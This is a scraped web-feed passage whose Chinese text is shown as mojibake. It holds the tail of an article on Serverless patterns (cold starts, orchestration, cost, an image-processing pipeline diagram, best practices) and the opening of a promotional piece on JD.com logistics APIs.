<h2 data-id="heading-11">ç¬¬ä¸‰éƒ¨åˆ†ï¼šå®æˆ˜æ¨¡å¼ç¯‡ (Practical Patterns)</h2>
<p>å½“æ„å»ºçœŸå®çš„ Serverless åº”ç”¨æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›ç»è¿‡éªŒè¯çš„æ¨¡å¼æ¥åº”å¯¹æŒ‘æˆ˜ã€‚</p>
<h3 data-id="heading-12">â‘© å†·å¯åŠ¨ä¼˜åŒ–ï¼ˆCold Start Optimizationï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šå‡å°‘å‡½æ•°é¦–æ¬¡å¯åŠ¨çš„å»¶è¿Ÿã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
å½“å‡½æ•°é•¿æ—¶é—´æœªæ‰§è¡Œæ—¶ï¼Œå¹³å°ä¼šå›æ”¶èµ„æºã€‚ä¸‹æ¬¡è¯·æ±‚åˆ°è¾¾æ—¶éœ€è¦é‡æ–°åˆå§‹åŒ–ï¼ˆå†·å¯åŠ¨ï¼‰ï¼Œå¯èƒ½è€—æ—¶å‡ ç§’ã€‚ä¼˜åŒ–æ–¹æ³•åŒ…æ‹¬ï¼šé¢„çƒ­ã€å‡å°ä»£ç åŒ…ã€ä½¿ç”¨è½»é‡çº§è¿è¡Œæ—¶ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å†·å¯åŠ¨æ˜¯ Serverless çš„ä¸»è¦ç—›ç‚¹ã€‚å¯¹äºå»¶è¿Ÿæ•æ„Ÿçš„åº”ç”¨ï¼ˆå¦‚ Web APIï¼‰ï¼Œå†·å¯åŠ¨ä¼šå½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e5943707fc0436ab26ceef1225d4932~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=y1nt%2B2RdvGh3u7e3XIhEfQLYeyE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-13">â‘ª å‡½æ•°ç¼–æ’ï¼ˆFunction Orchestrationï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šåè°ƒå¤šä¸ªå‡½æ•°å®Œæˆå¤æ‚å·¥ä½œæµã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
ä½¿ç”¨ç¼–æ’æœåŠ¡ï¼ˆå¦‚ AWS Step Functionsï¼‰å®šä¹‰å‡½æ•°æ‰§è¡Œçš„é¡ºåºã€æ¡ä»¶ã€å¹¶è¡Œã€é‡è¯•ç­‰é€»è¾‘ï¼Œæ„å»ºå¯é çš„ä¸šåŠ¡æµç¨‹ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å•ä¸ªå‡½æ•°åº”è¯¥ä¿æŒç®€å•ï¼Œå¤æ‚ä¸šåŠ¡éœ€è¦å¤šä¸ªå‡½æ•°åä½œã€‚ç¼–æ’æœåŠ¡æä¾›äº†å¯è§†åŒ–çš„å·¥ä½œæµå®šä¹‰ï¼Œå¤„ç†é”™è¯¯é‡è¯•ã€çŠ¶æ€ç®¡ç†ç­‰å¤æ‚é—®é¢˜ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51d01a9219c6419f93e1ed5d6ebf61ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=7n8%2FGsX5Ll40tLic5y59lXC%2BD3s%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-14">â‘« æˆæœ¬ä¼˜åŒ–ï¼ˆCost Optimizationï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šServerless æŒ‰ä½¿ç”¨é‡è®¡è´¹ï¼Œä½†ä¹Ÿå¯èƒ½äº§ç”Ÿæ„å¤–æˆæœ¬ã€‚</p>
<ul>
<li>
<p><strong>æ€ä¹ˆåšï¼Ÿ</strong><br/>
ä¼˜åŒ–ç­–ç•¥åŒ…æ‹¬ï¼šåˆç†è®¾ç½®å†…å­˜é…ç½®ã€é¿å…æ— é™å¾ªç¯ã€ä½¿ç”¨é¢„ç•™å®¹é‡ã€ç›‘æ§å¼‚å¸¸è°ƒç”¨ã€è®¾ç½®å¹¶å‘é™åˆ¶ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
è™½ç„¶ Serverless é€šå¸¸å¾ˆä¾¿å®œï¼Œä½†å¦‚æœé…ç½®ä¸å½“ï¼ˆå¦‚å†…å­˜è¿‡å¤§ã€è¢« DDoS æ”»å‡»ï¼‰ï¼Œæˆæœ¬å¯èƒ½å¤±æ§ã€‚æˆæœ¬ä¼˜åŒ–æ˜¯ Serverless åº”ç”¨çš„å¿…ä¿®è¯¾ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0547e7239c854c13be936733ab95b2d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=x9YRWVm4X6FybtE796TYUQq9KUA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-15">æ€»ç»“</h2>
<h3 data-id="heading-16">æ ¸å¿ƒå›é¡¾</h3>
<p><strong>ä¸€å¥è¯æ€»ç»“</strong>ï¼šServerless è®©å¼€å‘è€…ä»"ç®¡ç†æœåŠ¡å™¨"è§£æ”¾å‡ºæ¥ï¼Œä¸“æ³¨äº"åˆ›é€ ä»·å€¼"ã€‚</p>
<p><strong>æ ¸å¿ƒæ„ä¹‰</strong>ï¼š
æ‰€æœ‰ Serverless çš„æ¦‚å¿µï¼ˆFaaSã€äº‹ä»¶é©±åŠ¨ã€API ç½‘å…³ã€å¯¹è±¡å­˜å‚¨ã€æ‰˜ç®¡æ•°æ®åº“ã€å‡½æ•°ç¼–æ’ï¼‰éƒ½æ˜¯ä¸ºäº†å®ç°<strong>é›¶è¿ç»´ã€å¼¹æ€§æ‰©å±•ã€æŒ‰éœ€ä»˜è´¹</strong>çš„ç†æƒ³æ¶æ„ã€‚åªæœ‰æ‹¥æŠ± Serverlessï¼Œæ‰èƒ½çœŸæ­£åšåˆ°"å†™ä»£ç å°±å¤Ÿäº†"ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c074ecde35749cdb0d5dfae285e15e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=OGzwH8vxKdPji%2BswGWPz3I46nLY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-17">é™„å½•ï¼šServerless å®æˆ˜æ¡ˆä¾‹</h2>
<h3 data-id="heading-18">å›¾ç‰‡å¤„ç†æœåŠ¡ï¼ˆServerless æ¶æ„ï¼‰</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    U[ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡] --&gt; S3[å¯¹è±¡å­˜å‚¨ S3]
    S3 --&gt;|è§¦å‘äº‹ä»¶| F1[ç¼©ç•¥å›¾ç”Ÿæˆå‡½æ•°]
    S3 --&gt;|è§¦å‘äº‹ä»¶| F2[æ°´å°æ·»åŠ å‡½æ•°]
    S3 --&gt;|è§¦å‘äº‹ä»¶| F3[æ ¼å¼è½¬æ¢å‡½æ•°]
    
    F1 --&gt; S3_Thumb[S3 ç¼©ç•¥å›¾ç›®å½•]
    F2 --&gt; S3_Water[S3 æ°´å°ç›®å½•]
    F3 --&gt; S3_Convert[S3 è½¬æ¢ç›®å½•]
    
    S3_Thumb --&gt; CDN[CDN åˆ†å‘]
    S3_Water --&gt; CDN
    S3_Convert --&gt; CDN
    
    F1 --&gt; DDB[DynamoDB å…ƒæ•°æ®]
    F2 --&gt; DDB
    F3 --&gt; DDB
    
    CDN --&gt; U2[ç”¨æˆ·è®¿é—®]
</code></pre>
<p><strong>æ¶æ„ç‰¹ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>é›¶è¿ç»´</strong>ï¼šæ— éœ€ç®¡ç†æœåŠ¡å™¨ï¼Œä¸Šä¼ ä»£ç å³å¯è¿è¡Œ</li>
<li><strong>äº‹ä»¶é©±åŠ¨</strong>ï¼šæ–‡ä»¶ä¸Šä¼ è‡ªåŠ¨è§¦å‘å¤„ç†å‡½æ•°</li>
<li><strong>å¼¹æ€§æ‰©å±•</strong>ï¼šå¹¶å‘ä¸Šä¼ æ—¶è‡ªåŠ¨æ‰©å±•åˆ°æ•°åƒå®ä¾‹</li>
<li><strong>æŒ‰éœ€ä»˜è´¹</strong>ï¼šåªä¸ºå®é™…æ‰§è¡Œæ—¶é—´å’Œå­˜å‚¨ç©ºé—´ä»˜è´¹</li>
<li><strong>é«˜å¯ç”¨</strong>ï¼šäº‘å¹³å°è‡ªåŠ¨å¤„ç†å®¹é”™å’Œé‡è¯•</li>
</ol>
<h3 data-id="heading-19">Serverless vs ä¼ ç»Ÿæ¶æ„å¯¹æ¯”</h3>








































<table><thead><tr><th>ç»´åº¦</th><th>ä¼ ç»Ÿæ¶æ„</th><th>Serverless æ¶æ„</th></tr></thead><tbody><tr><td><strong>è¿ç»´è´Ÿæ‹…</strong></td><td>éœ€è¦ç®¡ç†æœåŠ¡å™¨ã€é…ç½®ã€æ‰©å®¹</td><td>é›¶è¿ç»´ï¼Œå¹³å°è‡ªåŠ¨ç®¡ç†</td></tr><tr><td><strong>æ‰©å±•æ€§</strong></td><td>æ‰‹åŠ¨æˆ–è‡ªåŠ¨æ‰©å®¹ï¼Œæœ‰ä¸Šé™</td><td>è‡ªåŠ¨æ— é™æ‰©å±•</td></tr><tr><td><strong>æˆæœ¬æ¨¡å‹</strong></td><td>æŒ‰æœåŠ¡å™¨æ—¶é—´ä»˜è´¹ï¼ˆé—²æ—¶æµªè´¹ï¼‰</td><td>æŒ‰æ‰§è¡Œæ¬¡æ•°å’Œæ—¶é•¿ä»˜è´¹</td></tr><tr><td><strong>å¯åŠ¨é€Ÿåº¦</strong></td><td>æœåŠ¡å¸¸é©»ï¼Œå“åº”å¿«</td><td>å†·å¯åŠ¨å¯èƒ½æœ‰å»¶è¿Ÿ</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>é•¿è¿æ¥ã€é«˜é¢‘è°ƒç”¨</td><td>çªå‘æµé‡ã€å®šæ—¶ä»»åŠ¡ã€äº‹ä»¶å¤„ç†</td></tr><tr><td><strong>å¼€å‘ä½“éªŒ</strong></td><td>éœ€è¦å…³æ³¨åŸºç¡€è®¾æ–½</td><td>åªå…³æ³¨ä¸šåŠ¡ä»£ç </td></tr></tbody></table>
<h3 data-id="heading-20">æœ€ä½³å®è·µå»ºè®®</h3>
<ol>
<li><strong>å‡½æ•°è®¾è®¡</strong>ï¼šä¿æŒå‡½æ•°å•ä¸€èŒè´£ï¼Œç²’åº¦é€‚ä¸­ï¼ˆä¸è¦å¤ªå¤§ä¹Ÿä¸è¦å¤ªç¢ï¼‰</li>
<li><strong>çŠ¶æ€ç®¡ç†</strong>ï¼šå‡½æ•°æ— çŠ¶æ€ï¼ŒçŠ¶æ€å­˜å‚¨åˆ°æ•°æ®åº“æˆ–å¯¹è±¡å­˜å‚¨</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå®ç°é‡è¯•æœºåˆ¶å’Œæ­»ä¿¡é˜Ÿåˆ—</li>
<li><strong>å®‰å…¨æ€§</strong>ï¼šæœ€å°æƒé™åŸåˆ™ï¼Œä½¿ç”¨ IAM è§’è‰²æ§åˆ¶è®¿é—®</li>
<li><strong>ç›‘æ§å‘Šè­¦</strong>ï¼šè®¾ç½®å…³é”®æŒ‡æ ‡å‘Šè­¦ï¼ˆé”™è¯¯ç‡ã€å»¶è¿Ÿã€æˆæœ¬ï¼‰</li>
<li><strong>æµ‹è¯•ç­–ç•¥</strong>ï¼šæœ¬åœ°æ¨¡æ‹Ÿç¯å¢ƒ + äº‘ç«¯é›†æˆæµ‹è¯•</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[äº¬ä¸œAPIï¼šå¼€å¯ç”µå•†ç‰©æµæ–°é€Ÿåº¦ï¼Œè®¢å•é…é€å¿«äººä¸€æ­¥ï¼]]></title>    <link>https://juejin.cn/post/7581081334850289705</link>    <guid>https://juejin.cn/post/7581081334850289705</guid>    <pubDate>2025-12-08T06:25:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581081334850289705" data-draft-id="7580683234437218367" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="â€‹â€‹â€‹â€‹â€‹â€‹â€‹äº¬ä¸œAPIï¼šå¼€å¯ç”µå•†ç‰©æµæ–°é€Ÿåº¦ï¼Œè®¢å•é…é€å¿«äººä¸€æ­¥ï¼"/> <meta itemprop="keywords" content="API"/> <meta itemprop="datePublished" content="2025-12-08T06:25:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è´¸è¿å¤©ä¸‹"/> <meta itemprop="url" content="https://juejin.cn/user/3959775760754074"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            â€‹â€‹â€‹â€‹â€‹â€‹â€‹äº¬ä¸œAPIï¼šå¼€å¯ç”µå•†ç‰©æµæ–°é€Ÿåº¦ï¼Œè®¢å•é…é€å¿«äººä¸€æ­¥ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3959775760754074/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è´¸è¿å¤©ä¸‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:25:58.000Z" title="Mon Dec 08 2025 06:25:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<p>Â åœ¨ç”µå•†ç«äº‰æ—¥ç›Šæ¿€çƒˆçš„ä»Šå¤©ï¼Œâ€œé€Ÿåº¦â€å·²æˆä¸ºç”¨æˆ·ä½“éªŒçš„æ ¸å¿ƒè¦ç´ ã€‚äº¬ä¸œå‡­å€Ÿå…¶å¼ºå¤§çš„è‡ªå»ºç‰©æµä½“ç³»ï¼Œå§‹ç»ˆå¼•é¢†ç€é…é€æ—¶æ•ˆçš„æ ‡å‡†ã€‚è€Œé¢å‘å¼€å‘è€…å’Œåˆä½œä¼™ä¼´å¼€æ”¾çš„ <strong>äº¬ä¸œAPI</strong>ï¼Œåˆ™å¦‚åŒä¸ºç”µå•†ç‰©æµå¼•æ“æ³¨å…¥äº†æ–°çš„æ¶¡è½®å¢å‹å™¨ï¼Œè®©è®¢å•é…é€æ•ˆç‡å®ç°è´¨çš„é£è·ƒã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨äº¬ä¸œAPIå¦‚ä½•ä»æŠ€æœ¯å±‚é¢èµ‹èƒ½ï¼ŒåŠ©åŠ›å•†å®¶å®ç°â€œå¿«äººä¸€æ­¥â€çš„é…é€ä½“éªŒã€‚</p>
<h3 data-id="heading-0">ä¸€ã€ æ•ˆç‡ä¹‹æºï¼šAPIé©±åŠ¨çš„æ™ºèƒ½ç‰©æµååŒ</h3>
<p>ä¼ ç»Ÿç”µå•†ç‰©æµç¯èŠ‚å¤šã€é“¾æ¡é•¿ï¼Œä¿¡æ¯ä¼ é€’çš„å»¶è¿Ÿæˆ–æ–­å±‚æ˜¯å¯¼è‡´é…é€ç¼“æ…¢çš„å¸¸è§ç“¶é¢ˆã€‚äº¬ä¸œAPIçš„æ ¸å¿ƒä»·å€¼åœ¨äº <strong>æ‰“é€šæ•°æ®å­¤å²›ï¼Œå®ç°ç³»ç»Ÿé—´çš„é«˜æ•ˆååŒ</strong>ã€‚</p>
<ol>
<li>
<p><strong>è®¢å•çŠ¶æ€å®æ—¶åŒæ­¥ï¼š</strong> é€šè¿‡ <code>è®¢å•æŸ¥è¯¢API</code>ï¼Œå•†å®¶ç³»ç»Ÿå¯å®æ—¶è·å–è®¢å•åœ¨äº¬ä¸œç‰©æµé“¾è·¯ä¸Šçš„æœ€æ–°çŠ¶æ€ï¼ˆå¦‚ï¼šå·²å‡ºåº“ã€è¿è¾“ä¸­ã€æ´¾é€ä¸­ã€å·²ç­¾æ”¶ï¼‰ã€‚è¿™æ¶ˆé™¤äº†æ‰‹åŠ¨æŸ¥è¯¢æˆ–ç­‰å¾…ç³»ç»Ÿæ¨é€çš„å»¶è¿Ÿï¼Œè®©è¿è¥å›¢é˜Ÿç¬¬ä¸€æ—¶é—´æŒæ¡åŠ¨æ€ï¼Œä¹Ÿèƒ½åŠæ—¶å‘æ¶ˆè´¹è€…åŒæ­¥ç²¾å‡†çš„ç‰©æµè½¨è¿¹ã€‚</p>
</li>
<li>
<p><strong>åº“å­˜æ™ºèƒ½è”åŠ¨ï¼š</strong> <code>åº“å­˜æŸ¥è¯¢API</code> ä¸ <code>åº“å­˜åŒæ­¥API</code> å…è®¸å•†å®¶ç³»ç»Ÿä¸äº¬ä¸œä»“é…ç³»ç»Ÿè¿›è¡Œåº“å­˜æ•°æ®çš„åŒå‘å®æ—¶äº¤äº’ã€‚è¿™ç¡®ä¿äº†ï¼š</p>
<ul>
<li><strong>å‰ç«¯å±•ç¤ºå‡†ç¡®ï¼š</strong> é¿å…è¶…å–æˆ–æ˜¾ç¤ºæ— è´§ï¼Œæå‡è½¬åŒ–ç‡ã€‚</li>
<li><strong>å°±è¿‘å‘è´§ï¼š</strong> ç»“åˆ <code>åœ°å€åº“API</code> å’Œåº“å­˜åˆ†å¸ƒï¼Œæ™ºèƒ½é€‰æ‹©æœ€ä¼˜ä»“åº“å‘è´§ï¼Œæ˜¾è‘—ç¼©çŸ­é…é€åŠå¾„ã€‚</li>
<li><strong>æ™ºèƒ½è¡¥è´§é¢„è­¦ï¼š</strong> åŸºäºå®æ—¶åº“å­˜å’Œé”€å”®é¢„æµ‹APIæ•°æ®ï¼Œè‡ªåŠ¨è§¦å‘è¡¥è´§æµç¨‹ï¼Œä¿éšœä¾›åº”ä¸æ–­æ¡£ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-1">äºŒã€ é€Ÿåº¦å¼•æ“ï¼šAPIèµ‹èƒ½çš„ç²¾ç»†åŒ–é…é€ç®¡ç†</h3>
<p>äº¬ä¸œAPIä¸ä»…æä¾›ä¿¡æ¯æŸ¥è¯¢ï¼Œæ›´æä¾›äº†å¼ºå¤§çš„ <strong>æ“ä½œæŒ‡ä»¤æ¥å£</strong>ï¼Œè®©å•†å®¶èƒ½ä¸»åŠ¨å¹²é¢„å’Œä¼˜åŒ–é…é€æµç¨‹ã€‚</p>
<ol>
<li><strong>é¢„çº¦é…é€ï¼š</strong> <code>é¢„çº¦æ—¶é—´API</code> å…è®¸å•†å®¶æˆ–æ¶ˆè´¹è€…åœ¨è®¢å•åˆ›å»ºåï¼Œçµæ´»æŒ‡å®šæœŸæœ›çš„æ”¶è´§æ—¶é—´æ®µï¼ˆå¦‚å·¥ä½œæ—¥å¤œé—´ã€å‘¨æœ«ï¼‰ã€‚äº¬ä¸œç‰©æµç³»ç»Ÿæ®æ­¤æ™ºèƒ½è°ƒåº¦è¿åŠ›ï¼Œæé«˜ä¸€æ¬¡é…é€æˆåŠŸç‡ï¼Œå‡å°‘å› æ”¶è´§äººä¸åœ¨å¯¼è‡´çš„å»¶è¯¯ã€‚</li>
<li><strong>ç”µå­é¢å•ä¸æ™ºèƒ½åˆ†å•ï¼š</strong> <code>ç”µå­é¢å•API</code> ä½¿å•†å®¶ç³»ç»Ÿèƒ½è‡ªåŠ¨ç”Ÿæˆç¬¦åˆäº¬ä¸œè§„èŒƒçš„è¿å•æ ‡ç­¾ï¼Œæ— ç¼å¯¹æ¥äº¬ä¸œçš„åˆ†æ‹£ç³»ç»Ÿã€‚ç»“åˆ <code>åœ°å€è§£æAPI</code> å¯¹æ”¶è´§åœ°å€è¿›è¡Œæ™ºèƒ½è¯†åˆ«å’Œæ ‡å‡†åŒ–å¤„ç†ï¼Œç¡®ä¿åŒ…è£¹èƒ½è¢«å¿«é€Ÿã€å‡†ç¡®åœ°è·¯ç”±åˆ°æ­£ç¡®çš„é…é€ç«™ç‚¹å’Œé…é€å‘˜æ‰‹ä¸­ã€‚</li>
<li><strong>è½¨è¿¹é¢„åˆ¤ä¸å¼‚å¸¸é¢„è­¦ï¼š</strong> æ·±åº¦æ•´åˆçš„ç‰©æµæ•°æ®ï¼Œç»“åˆç®—æ³•æ¨¡å‹ï¼ŒAPIå¯æä¾›æ½œåœ¨çš„é…é€æ—¶é—´é¢„æµ‹ï¼ˆè™½éå®˜æ–¹æ‰¿è¯ºï¼Œä½†æœ‰é‡è¦å‚è€ƒä»·å€¼ï¼‰ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œç³»ç»Ÿèƒ½é€šè¿‡APIæ¥å£æˆ–æ¶ˆæ¯æ¨é€ï¼Œ <strong>æå‰é¢„è­¦</strong> å¯èƒ½å‘ç”Ÿçš„é…é€å¼‚å¸¸ï¼ˆå¦‚ï¼šå¤©æ°”å½±å“ã€åœ°å€å¼‚å¸¸ã€åŒ…è£¹æ»ç•™ï¼‰ï¼Œè®©å•†å®¶å’Œå®¢æœèƒ½æå‰ä»‹å…¥å¤„ç†ï¼Œå‡å°‘è¢«åŠ¨ç­‰å¾…ã€‚</li>
</ol>
<h3 data-id="heading-2">ä¸‰ã€ æ—¶æ•ˆé£è·ƒï¼šAPIåŠ©åŠ›â€œæé€Ÿè¾¾â€ä¸â€œç²¾å‡†è¾¾â€</h3>
<p>äº¬ä¸œçš„æ ¸å¿ƒä¼˜åŠ¿ç‰©æµäº§å“ï¼Œå¦‚â€œ211é™æ—¶è¾¾â€ã€â€œäº¬å‡†è¾¾â€ç­‰ï¼Œå…¶é«˜æ•ˆè¿è¡Œçš„èƒŒåç¦»ä¸å¼€APIçš„å¼ºå¤§æ”¯æ’‘ã€‚</p>
<ol>
